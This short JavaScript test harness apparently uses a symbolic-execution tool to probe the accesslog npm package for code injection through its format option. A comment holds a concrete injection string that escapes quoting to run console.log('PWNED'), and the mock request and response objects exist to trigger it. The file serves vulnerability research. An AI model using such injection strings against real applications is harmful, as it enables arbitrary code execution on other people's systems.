const accesslog = require("accesslog");
const esl_symbolic = require("esl_symbolic");
//"\\\" + console.log('PWNED'); //"
payload = esl_symbolic.string("payload");
const handler = accesslog({format: payload,});
// Minimal req/res so accesslog doesn’t choke before our payload runs
const req = { method: "GET", url: "/" };
const res = {
    statusCode: 200,
    getHeader() { return undefined; },
    end() {}, // accesslog will monkey-patch this
};

handler(req, res, () => {});
res.end(); // <-- accesslog logs on end/finish

